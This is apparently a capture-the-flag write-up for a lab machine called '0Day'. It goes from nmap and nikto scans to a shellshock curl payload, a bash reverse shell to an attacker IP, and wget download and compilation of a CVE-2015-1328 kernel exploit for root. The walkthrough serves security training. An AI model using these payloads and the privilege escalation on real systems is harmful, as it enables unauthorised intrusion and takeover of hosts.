#Title: 0Day

#Difficulty: Medium

#Type: Kernel Exploit

#By Fagan Afandiyev.

```shell
THM="10.10.78.47"
```

```bash
nmap -sC -sV $THM
```

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are 2 ports open: 22,80. We see that there is a website running here.

Lets check with nikto.

```bash
nikto --url http://$THM  
```

```shell
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.78.47
+ Target Hostname:    10.10.78.47
+ Target Port:        80
+ Start Time:         2023-11-12 19:57:39 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /cgi-bin/test.cgi: Uncommon header '93e4r0-cve-2014-6271' found, with contents: true.
+ /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
+ /admin/: This might be interesting.
+ /backup/: This might be interesting.
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /secret/: This might be interesting.
+ /cgi-bin/test.cgi: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/


```

There are couple important parts to look at: */admin/* */backup/* */secret/*.
*/admin/* and */secret/* directories are empty but backup includes s ssh key that we can decrypty but there are more to look at right now.

It appears that there is a `shellshock` vulnerability at `/cgi-bin/test.cgi`. We can use curl to exploit it and run commands in server.

```bash
curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://$THM/cgi-bin/test.cgi
```

```shell
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
We proved this website is vulnerable to shellshock. We can change the code and get a reverse shell.
Lets first start listening with netcat.

```bash
nc -lnvp 22
```


```bash
curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -c 'bash -i >& /dev/tcp/10.6.87.204/22 0>&1'" http://$THM/cgi-bin/test.cgi 
```

```bash
www-data@ubuntu:/usr/lib/cgi-bin$ cat /home/ryan/user.txt
<Redacted>
```

```bash
www-data@ubuntu:/usr/lib/cgi-bin$ whoami
whoami
www-data
```

```bash
www-data@ubuntu:/usr/lib/cgi-bin$ uname -a
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

This version of linux is vulnerable to CVE-2015-1328.
We need to get the exploit to the server for that we will need to download to our own machine and create a python server and wget from our machine.

```bash
#Attacker 
wget https://www.exploit-db.com/download/37292
python -m http.server 
#Enemy
cd /tmp/
wget 10.6.87.204:8000/37292.c
gcc 37292.c -o privesc
```

```shell
gcc: error trying to exec 'cc1': execvp: No such file or directory
```
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

```bash
gcc 37292.c -o privesc
./privesc
```
BOOM!!! We are root. We can now go and get the root flag.

```bash
cd /root/
cat root.txt 
<Redacted>
```
